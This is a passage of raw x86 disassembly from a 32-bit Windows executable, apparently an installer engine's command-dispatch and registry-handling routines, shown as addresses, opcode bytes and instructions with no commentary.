  4024f7:	57                   	push   %edi
  4024f8:	ff 15 1c 70 40 00    	call   *0x40701c
  4024fe:	e9 2f 04 00 00       	jmp    0x402932
  402503:	38 1e                	cmp    %bl,(%esi)
  402505:	0f 84 27 04 00 00    	je     0x402932
  40250b:	56                   	push   %esi
  40250c:	e8 0a 34 00 00       	call   0x40591b
  402511:	50                   	push   %eax
  402512:	e9 f3 f9 ff ff       	jmp    0x401f0a
  402517:	6a ed                	push   $0xffffffed
  402519:	e8 7f 05 00 00       	call   0x402a9d
  40251e:	ff 75 e4             	push   -0x1c(%ebp)
  402521:	ff 75 e0             	push   -0x20(%ebp)
  402524:	50                   	push   %eax
  402525:	e8 56 31 00 00       	call   0x405680
  40252a:	83 f8 ff             	cmp    $0xffffffff,%eax
  40252d:	0f 84 a2 01 00 00    	je     0x4026d5
  402533:	50                   	push   %eax
  402534:	e9 48 f0 ff ff       	jmp    0x401581
  402539:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  40253c:	74 11                	je     0x40254f
  40253e:	6a 01                	push   $0x1
  402540:	e8 3b 05 00 00       	call   0x402a80
  402545:	a2 e8 9f 40 00       	mov    %al,0x409fe8
  40254a:	33 c0                	xor    %eax,%eax
  40254c:	40                   	inc    %eax
  40254d:	eb 0d                	jmp    0x40255c
  40254f:	6a 11                	push   $0x11
  402551:	e8 47 05 00 00       	call   0x402a9d
  402556:	50                   	push   %eax
  402557:	e8 5e 34 00 00       	call   0x4059ba
  40255c:	38 1e                	cmp    %bl,(%esi)
  40255e:	0f 84 73 01 00 00    	je     0x4026d7
  402564:	8d 4d 08             	lea    0x8(%ebp),%ecx
  402567:	53                   	push   %ebx
  402568:	51                   	push   %ecx
  402569:	50                   	push   %eax
  40256a:	68 e8 9f 40 00       	push   $0x409fe8
  40256f:	56                   	push   %esi
  402570:	e8 a6 33 00 00       	call   0x40591b
  402575:	50                   	push   %eax
  402576:	ff 15 24 71 40 00    	call   *0x407124
  40257c:	e9 47 f0 ff ff       	jmp    0x4015c8
  402581:	6a 02                	push   $0x2
  402583:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  402586:	e8 f5 04 00 00       	call   0x402a80
  40258b:	83 f8 01             	cmp    $0x1,%eax
  40258e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402591:	0f 8c 9b 03 00 00    	jl     0x402932
  402597:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  40259c:	3b c1                	cmp    %ecx,%eax
  40259e:	7e 03                	jle    0x4025a3
  4025a0:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4025a3:	38 1e                	cmp    %bl,(%esi)
  4025a5:	0f 84 8e 00 00 00    	je     0x402639
  4025ab:	56                   	push   %esi
  4025ac:	88 5d 0b             	mov    %bl,0xb(%ebp)
  4025af:	e8 67 33 00 00       	call   0x40591b
  4025b4:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  4025b7:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4025ba:	7e 7d                	jle    0x402639
  4025bc:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  4025bf:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4025c2:	53                   	push   %ebx
  4025c3:	50                   	push   %eax
  4025c4:	8d 45 f7             	lea    -0x9(%ebp),%eax
  4025c7:	6a 01                	push   $0x1
  4025c9:	50                   	push   %eax
  4025ca:	ff 75 cc             	push   -0x34(%ebp)
  4025cd:	ff 15 2c 71 40 00    	call   *0x40712c
  4025d3:	85 c0                	test   %eax,%eax
  4025d5:	74 65                	je     0x40263c
  4025d7:	83 7d d0 01          	cmpl   $0x1,-0x30(%ebp)
  4025db:	75 5f                	jne    0x40263c
  4025dd:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  4025e0:	75 21                	jne    0x402603
  4025e2:	80 7d 0b 0d          	cmpb   $0xd,0xb(%ebp)
  4025e6:	74 2b                	je     0x402613
  4025e8:	80 7d 0b 0a          	cmpb   $0xa,0xb(%ebp)
  4025ec:	74 25                	je     0x402613
  4025ee:	8a 45 f7             	mov    -0x9(%ebp),%al
  4025f1:	88 04 3e             	mov    %al,(%esi,%edi,1)
  4025f4:	46                   	inc    %esi
  4025f5:	3a c3                	cmp    %bl,%al
  4025f7:	88 45 0b             	mov    %al,0xb(%ebp)
  4025fa:	74 40                	je     0x40263c
  4025fc:	3b 75 f8             	cmp    -0x8(%ebp),%esi
  4025ff:	7c be                	jl     0x4025bf
  402601:	eb 39                	jmp    0x40263c
  402603:	0f b6 45 f7          	movzbl -0x9(%ebp),%eax
  402607:	50                   	push   %eax
  402608:	57                   	push   %edi
  402609:	e8 f4 32 00 00       	call   0x405902
  40260e:	e9 28 03 00 00       	jmp    0x40293b
  402613:	8a 45 f7             	mov    -0x9(%ebp),%al
  402616:	38 45 0b             	cmp    %al,0xb(%ebp)
  402619:	74 0e                	je     0x402629
  40261b:	3c 0d                	cmp    $0xd,%al
  40261d:	74 04                	je     0x402623
  40261f:	3c 0a                	cmp    $0xa,%al
  402621:	75 06                	jne    0x402629
  402623:	88 04 3e             	mov    %al,(%esi,%edi,1)
  402626:	46                   	inc    %esi
  402627:	eb 13                	jmp    0x40263c
  402629:	6a 01                	push   $0x1
  40262b:	53                   	push   %ebx
  40262c:	6a ff                	push   $0xffffffff
  40262e:	ff 75 cc             	push   -0x34(%ebp)
  402631:	ff 15 30 71 40 00    	call   *0x407130
  402637:	eb 03                	jmp    0x40263c
  402639:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  40263c:	88 1c 3e             	mov    %bl,(%esi,%edi,1)
  40263f:	3b f3                	cmp    %ebx,%esi
  402641:	e9 84 ef ff ff       	jmp    0x4015ca
  402646:	38 1e                	cmp    %bl,(%esi)
  402648:	0f 84 e4 02 00 00    	je     0x402932
  40264e:	ff 75 e8             	push   -0x18(%ebp)
  402651:	53                   	push   %ebx
  402652:	6a 02                	push   $0x2
  402654:	e8 27 04 00 00       	call   0x402a80
  402659:	50                   	push   %eax
  40265a:	56                   	push   %esi
  40265b:	e8 bb 32 00 00       	call   0x40591b
  402660:	50                   	push   %eax
  402661:	ff 15 30 71 40 00    	call   *0x407130
  402667:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  40266a:	0f 8c c2 02 00 00    	jl     0x402932
  402670:	e9 63 02 00 00       	jmp    0x4028d8
  402675:	38 1e                	cmp    %bl,(%esi)
  402677:	0f 84 b5 02 00 00    	je     0x402932
  40267d:	56                   	push   %esi
  40267e:	e8 98 32 00 00       	call   0x40591b
  402683:	50                   	push   %eax
  402684:	ff 15 34 71 40 00    	call   *0x407134
  40268a:	e9 a3 02 00 00       	jmp    0x402932
  40268f:	38 1f                	cmp    %bl,(%edi)
  402691:	74 18                	je     0x4026ab
  402693:	8d 85 5c fe ff ff    	lea    -0x1a4(%ebp),%eax
  402699:	50                   	push   %eax
  40269a:	57                   	push   %edi
  40269b:	e8 7b 32 00 00       	call   0x40591b
  4026a0:	50                   	push   %eax
  4026a1:	ff 15 38 71 40 00    	call   *0x407138
  4026a7:	85 c0                	test   %eax,%eax
  4026a9:	75 3f                	jne    0x4026ea
  4026ab:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4026b2:	88 1e                	mov    %bl,(%esi)
  4026b4:	e9 79 02 00 00       	jmp    0x402932
  4026b9:	6a 02                	push   $0x2
  4026bb:	e8 dd 03 00 00       	call   0x402a9d
  4026c0:	8d 8d 5c fe ff ff    	lea    -0x1a4(%ebp),%ecx
  4026c6:	51                   	push   %ecx
  4026c7:	50                   	push   %eax
  4026c8:	ff 15 3c 71 40 00    	call   *0x40713c
  4026ce:	83 f8 ff             	cmp    $0xffffffff,%eax
  4026d1:	75 10                	jne    0x4026e3
  4026d3:	88 1f                	mov    %bl,(%edi)
  4026d5:	88 1e                	mov    %bl,(%esi)
  4026d7:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4026de:	e9 4f 02 00 00       	jmp    0x402932
  4026e3:	50                   	push   %eax
  4026e4:	57                   	push   %edi
  4026e5:	e8 18 32 00 00       	call   0x405902
  4026ea:	8d 85 88 fe ff ff    	lea    -0x178(%ebp),%eax
  4026f0:	50                   	push   %eax
  4026f1:	56                   	push   %esi
  4026f2:	e9 61 01 00 00       	jmp    0x402858
  4026f7:	53                   	push   %ebx
  4026f8:	c7 45 cc 66 fd ff ff 	movl   $0xfffffd66,-0x34(%ebp)
  4026ff:	e8 99 03 00 00       	call   0x402a9d
  402704:	8b f0                	mov    %eax,%esi
  402706:	56                   	push   %esi
  402707:	e8 fd 2d 00 00       	call   0x405509
  40270c:	85 c0                	test   %eax,%eax
  40270e:	56                   	push   %esi
  40270f:	74 0d                	je     0x40271e
  402711:	be e8 9f 40 00       	mov    $0x409fe8,%esi
  402716:	56                   	push   %esi
  402717:	e8 88 32 00 00       	call   0x4059a4
  40271c:	eb 20                	jmp    0x40273e
  40271e:	68 00 54 43 00       	push   $0x435400
  402723:	68 e8 9f 40 00       	push   $0x409fe8
  402728:	e8 77 32 00 00       	call   0x4059a4
  40272d:	50                   	push   %eax
  40272e:	e8 6a 2d 00 00       	call   0x40549d
  402733:	50                   	push   %eax
  402734:	e8 87 32 00 00       	call   0x4059c0
  402739:	be e8 9f 40 00       	mov    $0x409fe8,%esi
  40273e:	56                   	push   %esi
  40273f:	e8 8f 34 00 00       	call   0x405bd3
  402744:	56                   	push   %esi
  402745:	e8 17 2f 00 00       	call   0x405661
  40274a:	6a 02                	push   $0x2
  40274c:	68 00 00 00 40       	push   $0x40000000
  402751:	56                   	push   %esi
  402752:	e8 29 2f 00 00       	call   0x405680
  402757:	83 f8 ff             	cmp    $0xffffffff,%eax
  40275a:	89 45 08             	mov    %eax,0x8(%ebp)
  40275d:	0f 84 a2 00 00 00    	je     0x402805
  402763:	a1 2c f0 42 00       	mov    0x42f02c,%eax
  402768:	8b 35 f8 70 40 00    	mov    0x4070f8,%esi
  40276e:	50                   	push   %eax
  40276f:	6a 40                	push   $0x40
  402771:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  402774:	ff d6                	call   *%esi
  402776:	8b f8                	mov    %eax,%edi
  402778:	3b fb                	cmp    %ebx,%edi
  40277a:	74 7b                	je     0x4027f7
  40277c:	53                   	push   %ebx
  40277d:	e8 90 09 00 00       	call   0x403112
  402782:	ff 75 d4             	push   -0x2c(%ebp)
  402785:	57                   	push   %edi
  402786:	e8 55 09 00 00       	call   0x4030e0
  40278b:	ff 75 e4             	push   -0x1c(%ebp)
  40278e:	6a 40                	push   $0x40
  402790:	ff d6                	call   *%esi
  402792:	8b f0                	mov    %eax,%esi
  402794:	3b f3                	cmp    %ebx,%esi
  402796:	89 75 d0             	mov    %esi,-0x30(%ebp)
  402799:	74 34                	je     0x4027cf
  40279b:	ff 75 e4             	push   -0x1c(%ebp)
  40279e:	56                   	push   %esi
  40279f:	53                   	push   %ebx
  4027a0:	ff 75 e0             	push   -0x20(%ebp)
  4027a3:	e8 0c 07 00 00       	call   0x402eb4
  4027a8:	eb 18                	jmp    0x4027c2
  4027aa:	8b 0e                	mov    (%esi),%ecx
  4027ac:	8b 46 04             	mov    0x4(%esi),%eax
  4027af:	83 c6 08             	add    $0x8,%esi
  4027b2:	51                   	push   %ecx
  4027b3:	03 c7                	add    %edi,%eax
  4027b5:	56                   	push   %esi
  4027b6:	50                   	push   %eax
  4027b7:	89 4d c8             	mov    %ecx,-0x38(%ebp)
  4027ba:	e8 82 2e 00 00       	call   0x405641
  4027bf:	03 75 c8             	add    -0x38(%ebp),%esi
  4027c2:	38 1e                	cmp    %bl,(%esi)
  4027c4:	75 e4                	jne    0x4027aa
  4027c6:	ff 75 d0             	push   -0x30(%ebp)
  4027c9:	ff 15 f4 70 40 00    	call   *0x4070f4
  4027cf:	8d 45 bc             	lea    -0x44(%ebp),%eax
  4027d2:	53                   	push   %ebx
  4027d3:	50                   	push   %eax
  4027d4:	ff 75 d4             	push   -0x2c(%ebp)
  4027d7:	57                   	push   %edi
  4027d8:	ff 75 08             	push   0x8(%ebp)
  4027db:	ff 15 24 71 40 00    	call   *0x407124
  4027e1:	57                   	push   %edi
  4027e2:	ff 15 f4 70 40 00    	call   *0x4070f4
  4027e8:	53                   	push   %ebx
  4027e9:	53                   	push   %ebx
  4027ea:	ff 75 08             	push   0x8(%ebp)
  4027ed:	6a ff                	push   $0xffffffff
  4027ef:	e8 c0 06 00 00       	call   0x402eb4
  4027f4:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4027f7:	ff 75 08             	push   0x8(%ebp)
  4027fa:	ff 15 a4 70 40 00    	call   *0x4070a4
  402800:	be e8 9f 40 00       	mov    $0x409fe8,%esi
  402805:	39 5d cc             	cmp    %ebx,-0x34(%ebp)
  402808:	6a f3                	push   $0xfffffff3
  40280a:	5f                   	pop    %edi
  40280b:	7d 11                	jge    0x40281e
  40280d:	6a ef                	push   $0xffffffef
  40280f:	5f                   	pop    %edi
  402810:	56                   	push   %esi
  402811:	ff 15 40 71 40 00    	call   *0x407140
  402817:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40281e:	57                   	push   %edi
  40281f:	e9 c1 f9 ff ff       	jmp    0x4021e5
  402824:	53                   	push   %ebx
  402825:	e8 56 02 00 00       	call   0x402a80
  40282a:	3b 05 4c f0 42 00    	cmp    0x42f04c,%eax
  402830:	89 45 08             	mov    %eax,0x8(%ebp)
  402833:	0f 83 9e fe ff ff    	jae    0x4026d7
  402839:	8b f0                	mov    %eax,%esi
  40283b:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40283e:	69 f6 18 04 00 00    	imul   $0x418,%esi,%esi
  402844:	03 35 48 f0 42 00    	add    0x42f048,%esi
  40284a:	3b c3                	cmp    %ebx,%eax
  40284c:	7c 17                	jl     0x402865
  40284e:	8b 0c 86             	mov    (%esi,%eax,4),%ecx
  402851:	75 0f                	jne    0x402862
  402853:	83 c6 18             	add    $0x18,%esi
  402856:	56                   	push   %esi
  402857:	57                   	push   %edi
  402858:	e8 47 31 00 00       	call   0x4059a4
  40285d:	e9 d0 00 00 00       	jmp    0x402932
  402862:	51                   	push   %ecx
  402863:	eb 74                	jmp    0x4028d9
  402865:	83 c9 ff             	or     $0xffffffff,%ecx
  402868:	2b c8                	sub    %eax,%ecx
  40286a:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  40286d:	74 0c                	je     0x40287b
  40286f:	6a 01                	push   $0x1
  402871:	e8 0a 02 00 00       	call   0x402a80
  402876:	89 45 e0             	mov    %eax,-0x20(%ebp)
  402879:	eb 10                	jmp    0x40288b
  40287b:	ff 75 ec             	push   -0x14(%ebp)
  40287e:	8d 46 18             	lea    0x18(%esi),%eax
  402881:	50                   	push   %eax
  402882:	e8 3f 31 00 00       	call   0x4059c6
  402887:	80 4e 09 01          	orb    $0x1,0x9(%esi)
  40288b:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40288e:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  402891:	89 0c 86             	mov    %ecx,(%esi,%eax,4)
  402894:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  402897:	0f 84 95 00 00 00    	je     0x402932
  40289d:	ff 75 08             	push   0x8(%ebp)
  4028a0:	e8 d8 e8 ff ff       	call   0x40117d
  4028a5:	e9 88 00 00 00       	jmp    0x402932
  4028aa:	53                   	push   %ebx
  4028ab:	e8 d0 01 00 00       	call   0x402a80
  4028b0:	83 f8 20             	cmp    $0x20,%eax
  4028b3:	0f 83 1e fe ff ff    	jae    0x4026d7
  4028b9:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  4028bc:	74 23                	je     0x4028e1
  4028be:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  4028c1:	74 0f                	je     0x4028d2
  4028c3:	50                   	push   %eax
  4028c4:	e8 d0 e9 ff ff       	call   0x401299
  4028c9:	53                   	push   %ebx
  4028ca:	53                   	push   %ebx
  4028cb:	e8 1f e9 ff ff       	call   0x4011ef
  4028d0:	eb 60                	jmp    0x402932
  4028d2:	53                   	push   %ebx
  4028d3:	e8 0a ea ff ff       	call   0x4012e2
  4028d8:	50                   	push   %eax
  4028d9:	57                   	push   %edi
  4028da:	e8 23 30 00 00       	call   0x405902
  4028df:	eb 51                	jmp    0x402932
  4028e1:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  4028e4:	74 12                	je     0x4028f8
  4028e6:	8b 15 28 f0 42 00    	mov    0x42f028,%edx
  4028ec:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4028ef:	89 8c 82 94 00 00 00 	mov    %ecx,0x94(%edx,%eax,4)
  4028f6:	eb 3a                	jmp    0x402932
  4028f8:	8b 0d 28 f0 42 00    	mov    0x42f028,%ecx
  4028fe:	ff b4 81 94 00 00 00 	push   0x94(%ecx,%eax,4)
  402905:	57                   	push   %edi
  402906:	e8 bb 30 00 00       	call   0x4059c6
  40290b:	eb 25                	jmp    0x402932
  40290d:	8b 0d 88 b4 42 00    	mov    0x42b488,%ecx
  402913:	53                   	push   %ebx
  402914:	23 c8                	and    %eax,%ecx
  402916:	51                   	push   %ecx
  402917:	6a 0b                	push   $0xb
  402919:	ff 75 f8             	push   -0x8(%ebp)
  40291c:	ff 15 38 72 40 00    	call   *0x407238
  402922:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402925:	74 0b                	je     0x402932
  402927:	53                   	push   %ebx
  402928:	53                   	push   %ebx
  402929:	ff 75 f8             	push   -0x8(%ebp)
  40292c:	ff 15 34 72 40 00    	call   *0x407234
  402932:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402935:	01 05 a8 f0 42 00    	add    %eax,0x42f0a8
  40293b:	33 c0                	xor    %eax,%eax
  40293d:	5f                   	pop    %edi
  40293e:	5e                   	pop    %esi
  40293f:	5b                   	pop    %ebx
  402940:	c9                   	leave
  402941:	c2 04 00             	ret    $0x4
  402944:	3d 29 40 00 93       	cmp    $0x93004029,%eax
  402949:	14 40                	adc    $0x40,%al
  40294b:	00 9f 14 40 00 ba    	add    %bl,-0x45ffbfec(%edi)
  402951:	14 40                	adc    $0x40,%al
  402953:	00 dc                	add    %bl,%ah
  402955:	14 40                	adc    $0x40,%al
  402957:	00 18                	add    %bl,(%eax)
  402959:	15 40 00 32 15       	adc    $0x15320040,%eax
  40295e:	40                   	inc    %eax
  40295f:	00 87 15 40 00 b7    	add    %al,-0x48ffbfeb(%edi)
  402965:	15 40 00 d5 15       	adc    $0x15d50040,%eax
  40296a:	40                   	inc    %eax
  40296b:	00 56 16             	add    %dl,0x16(%esi)
  40296e:	40                   	inc    %eax
  40296f:	00 40 15             	add    %al,0x15(%eax)
  402972:	40                   	inc    %eax
  402973:	00 56 15             	add    %dl,0x15(%esi)
  402976:	40                   	inc    %eax
  402977:	00 77 15             	add    %dh,0x15(%edi)
  40297a:	40                   	inc    %eax
  40297b:	00 67 16             	add    %ah,0x16(%edi)
  40297e:	40                   	inc    %eax
  40297f:	00 fb                	add    %bh,%bl
  402981:	16                   	push   %ss
  402982:	40                   	inc    %eax
  402983:	00 5f 17             	add    %bl,0x17(%edi)
  402986:	40                   	inc    %eax
  402987:	00 86 17 40 00 99    	add    %al,-0x66ffbfe9(%esi)
  40298d:	17                   	pop    %ss
  40298e:	40                   	inc    %eax
  40298f:	00 3d 19 40 00 40    	add    %bh,0x40004019
  402995:	19 40 00             	sbb    %eax,0x0(%eax)
  402998:	72 19                	jb     0x4029b3
  40299a:	40                   	inc    %eax
  40299b:	00 87 19 40 00 99    	add    %al,-0x66ffbfe7(%edi)
  4029a1:	19 40 00             	sbb    %eax,0x0(%eax)
  4029a4:	1a 1a                	sbb    (%edx),%bl
  4029a6:	40                   	inc    %eax
  4029a7:	00 4b 1a             	add    %cl,0x1a(%ebx)
  4029aa:	40                   	inc    %eax
  4029ab:	00 8b 1a 40 00 bd    	add    %cl,-0x42ffbfe6(%ebx)
  4029b1:	1a 40 00             	sbb    0x0(%eax),%al
  4029b4:	4a                   	dec    %edx
  4029b5:	1b 40 00             	sbb    0x0(%eax),%eax
  4029b8:	6b 1b 40             	imul   $0x40,(%ebx),%ebx
  4029bb:	00 13                	add    %dl,(%ebx)
  4029bd:	1c 40                	sbb    $0x40,%al
  4029bf:	00 13                	add    %dl,(%ebx)
  4029c1:	1c 40                	sbb    $0x40,%al
  4029c3:	00 d5                	add    %dl,%ch
  4029c5:	1c 40                	sbb    $0x40,%al
  4029c7:	00 f2                	add    %dh,%dl
  4029c9:	1c 40                	sbb    $0x40,%al
  4029cb:	00 0d 1d 40 00 2c    	add    %cl,0x2c00401d
  4029d1:	1d 40 00 88 1d       	sbb    $0x1d880040,%eax
  4029d6:	40                   	inc    %eax
  4029d7:	00 02                	add    %al,(%edx)
  4029d9:	1e                   	push   %ds
  4029da:	40                   	inc    %eax
  4029db:	00 2e                	add    %ch,(%esi)
  4029dd:	1e                   	push   %ds
  4029de:	40                   	inc    %eax
  4029df:	00 96 1e 40 00 15    	add    %dl,0x1500401e(%esi)
  4029e5:	1f                   	pop    %ds
  4029e6:	40                   	inc    %eax
  4029e7:	00 45 1f             	add    %al,0x1f(%ebp)
  4029ea:	40                   	inc    %eax
  4029eb:	00 d6                	add    %dl,%dh
  4029ed:	1f                   	pop    %ds
  4029ee:	40                   	inc    %eax
  4029ef:	00 a3 20 40 00 f3    	add    %ah,-0xcffbfe0(%ebx)
  4029f5:	21 40 00             	and    %eax,0x0(%eax)
  4029f8:	76 22                	jbe    0x402a1c
  4029fa:	40                   	inc    %eax
  4029fb:	00 a5 22 40 00 e7    	add    %ah,-0x18ffbfde(%ebp)
  402a01:	22 40 00             	and    0x0(%eax),%al
  402a04:	27                   	daa
  402a05:	23 40 00             	and    0x0(%eax),%eax
  402a08:	83 23 40             	andl   $0x40,(%ebx)
  402a0b:	00 27                	add    %ah,(%edi)
  402a0d:	24 40                	and    $0x40,%al
  402a0f:	00 a2 24 40 00 03    	add    %ah,0x3004024(%edx)
  402a15:	25 40 00 17 25       	and    $0x25170040,%eax
  402a1a:	40                   	inc    %eax
  402a1b:	00 39                	add    %bh,(%ecx)
  402a1d:	25 40 00 81 25       	and    $0x25810040,%eax
  402a22:	40                   	inc    %eax
  402a23:	00 46 26             	add    %al,0x26(%esi)
  402a26:	40                   	inc    %eax
  402a27:	00 75 26             	add    %dh,0x26(%ebp)
  402a2a:	40                   	inc    %eax
  402a2b:	00 8f 26 40 00 b9    	add    %cl,-0x46ffbfda(%edi)
  402a31:	26 40                	es inc %eax
  402a33:	00 f7                	add    %dh,%bh
  402a35:	26 40                	es inc %eax
  402a37:	00 24 28             	add    %ah,(%eax,%ebp,1)
  402a3a:	40                   	inc    %eax
  402a3b:	00 aa 28 40 00 32    	add    %ch,0x32004028(%edx)
  402a41:	29 40 00             	sub    %eax,0x0(%eax)
  402a44:	32 29                	xor    (%ecx),%ch
  402a46:	40                   	inc    %eax
  402a47:	00 0d 29 40 00 de    	add    %cl,0xde004029
  402a4d:	1a 40 00             	sbb    0x0(%eax),%al
  402a50:	e2 1a                	loop   0x402a6c
  402a52:	40                   	inc    %eax
  402a53:	00 e6                	add    %ah,%dh
  402a55:	1a 40 00             	sbb    0x0(%eax),%al
  402a58:	ed                   	in     (%dx),%eax
  402a59:	1a 40 00             	sbb    0x0(%eax),%al
  402a5c:	fa                   	cli
  402a5d:	1a 40 00             	sbb    0x0(%eax),%al
  402a60:	fe                   	(bad)
  402a61:	1a 40 00             	sbb    0x0(%eax),%al
  402a64:	02 1b                	add    (%ebx),%bl
  402a66:	40                   	inc    %eax
  402a67:	00 06                	add    %al,(%esi)
  402a69:	1b 40 00             	sbb    0x0(%eax),%eax
  402a6c:	0f 1b 40 00          	bndstx %bnd0,0x0(%eax)
  402a70:	19 1b                	sbb    %ebx,(%ebx)
  402a72:	40                   	inc    %eax
  402a73:	00 26                	add    %ah,(%esi)
  402a75:	1b 40 00             	sbb    0x0(%eax),%eax
  402a78:	3e 1b 40 00          	sbb    %ds:0x0(%eax),%eax
  402a7c:	42                   	inc    %edx
  402a7d:	1b 40 00             	sbb    0x0(%eax),%eax
  402a80:	8b 44 24 04          	mov    0x4(%esp),%eax
  402a84:	8b 0d e0 9b 40 00    	mov    0x409be0,%ecx
  402a8a:	ff 34 81             	push   (%ecx,%eax,4)
  402a8d:	6a 00                	push   $0x0
  402a8f:	e8 32 2f 00 00       	call   0x4059c6
  402a94:	50                   	push   %eax
  402a95:	e8 81 2e 00 00       	call   0x40591b
  402a9a:	c2 04 00             	ret    $0x4
  402a9d:	56                   	push   %esi
  402a9e:	8b 74 24 08          	mov    0x8(%esp),%esi
  402aa2:	85 f6                	test   %esi,%esi
  402aa4:	57                   	push   %edi
  402aa5:	8b c6                	mov    %esi,%eax
  402aa7:	7d 02                	jge    0x402aab
  402aa9:	f7 d8                	neg    %eax
  402aab:	8b 15 e0 9b 40 00    	mov    0x409be0,%edx
  402ab1:	8b c8                	mov    %eax,%ecx
  402ab3:	83 e1 0f             	and    $0xf,%ecx
  402ab6:	c1 f8 04             	sar    $0x4,%eax
  402ab9:	ff 34 8a             	push   (%edx,%ecx,4)
  402abc:	c1 e0 0a             	shl    $0xa,%eax
  402abf:	05 e8 9b 40 00       	add    $0x409be8,%eax
  402ac4:	50                   	push   %eax
  402ac5:	e8 fc 2e 00 00       	call   0x4059c6
  402aca:	85 f6                	test   %esi,%esi
  402acc:	8b f8                	mov    %eax,%edi
  402ace:	7d 06                	jge    0x402ad6
  402ad0:	57                   	push   %edi
  402ad1:	e8 fd 30 00 00       	call   0x405bd3
  402ad6:	8b c7                	mov    %edi,%eax
  402ad8:	5f                   	pop    %edi
  402ad9:	5e                   	pop    %esi
  402ada:	c2 04 00             	ret    $0x4
  402add:	55                   	push   %ebp
  402ade:	8b ec                	mov    %esp,%ebp
  402ae0:	81 ec 0c 01 00 00    	sub    $0x10c,%esp
  402ae6:	53                   	push   %ebx
  402ae7:	56                   	push   %esi
  402ae8:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402aeb:	57                   	push   %edi
  402aec:	50                   	push   %eax
  402aed:	33 db                	xor    %ebx,%ebx
  402aef:	6a 08                	push   $0x8
  402af1:	53                   	push   %ebx
  402af2:	ff 75 0c             	push   0xc(%ebp)
  402af5:	ff 75 08             	push   0x8(%ebp)
  402af8:	ff 15 10 70 40 00    	call   *0x407010
  402afe:	3b c3                	cmp    %ebx,%eax
  402b00:	75 4d                	jne    0x402b4f
  402b02:	8b 35 08 70 40 00    	mov    0x407008,%esi
  402b08:	bf 05 01 00 00       	mov    $0x105,%edi
  402b0d:	eb 19                	jmp    0x402b28
  402b0f:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  402b12:	75 42                	jne    0x402b56
  402b14:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  402b1a:	53                   	push   %ebx
  402b1b:	50                   	push   %eax
  402b1c:	ff 75 fc             	push   -0x4(%ebp)
  402b1f:	e8 b9 ff ff ff       	call   0x402add
  402b24:	85 c0                	test   %eax,%eax
  402b26:	75 12                	jne    0x402b3a
  402b28:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  402b2e:	57                   	push   %edi
  402b2f:	50                   	push   %eax
  402b30:	53                   	push   %ebx
  402b31:	ff 75 fc             	push   -0x4(%ebp)
  402b34:	ff d6                	call   *%esi
  402b36:	85 c0                	test   %eax,%eax
  402b38:	74 d5                	je     0x402b0f
  402b3a:	ff 75 fc             	push   -0x4(%ebp)
  402b3d:	ff 15 1c 70 40 00    	call   *0x40701c
  402b43:	ff 75 0c             	push   0xc(%ebp)
  402b46:	ff 75 08             	push   0x8(%ebp)
  402b49:	ff 15 14 70 40 00    	call   *0x407014
  402b4f:	5f                   	pop    %edi
  402b50:	5e                   	pop    %esi
  402b51:	5b                   	pop    %ebx
  402b52:	c9                   	leave
  402b53:	c2 0c 00             	ret    $0xc
  402b56:	ff 75 fc             	push   -0x4(%ebp)
  402b59:	ff 15 1c 70 40 00    	call   *0x40701c
  402b5f:	33 c0                	xor    %eax,%eax
  402b61:	40                   	inc    %eax
  402b62:	eb eb                	jmp    0x402b4f
  402b64:	8b 44 24 04          	mov    0x4(%esp),%eax
  402b68:	85 c0                	test   %eax,%eax
  402b6a:	75 0a                	jne    0x402b76
  402b6c:	a1 a4 f0 42 00       	mov    0x42f0a4,%eax
  402b71:	05 01 00 00 80       	add    $0x80000001,%eax
  402b76:	c2 04 00             	ret    $0x4
  402b79:	55                   	push   %ebp
  402b7a:	8b ec                	mov    %esp,%ebp
  402b7c:	8d 45 08             	lea    0x8(%ebp),%eax
  402b7f:	50                   	push   %eax
  402b80:	ff 75 08             	push   0x8(%ebp)
  402b83:	6a 00                	push   $0x0
  402b85:	6a 22                	push   $0x22
  402b87:	e8 11 ff ff ff       	call   0x402a9d
  402b8c:	50                   	push   %eax
  402b8d:	a1 e0 9b 40 00       	mov    0x409be0,%eax
  402b92:	ff 70 04             	push   0x4(%eax)
  402b95:	e8 ca ff ff ff       	call   0x402b64
  402b9a:	50                   	push   %eax
  402b9b:	ff 15 10 70 40 00    	call   *0x407010
  402ba1:	f7 d8                	neg    %eax
  402ba3:	1b c0                	sbb    %eax,%eax
  402ba5:	f7 d0                	not    %eax
  402ba7:	23 45 08             	and    0x8(%ebp),%eax
  402baa:	5d                   	pop    %ebp
  402bab:	c2 04 00             	ret    $0x4
  402bae:	55                   	push   %ebp
  402baf:	8b ec                	mov    %esp,%ebp
  402bb1:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  402bb8:	56                   	push   %esi
  402bb9:	57                   	push   %edi
  402bba:	8b 7d 08             	mov    0x8(%ebp),%edi
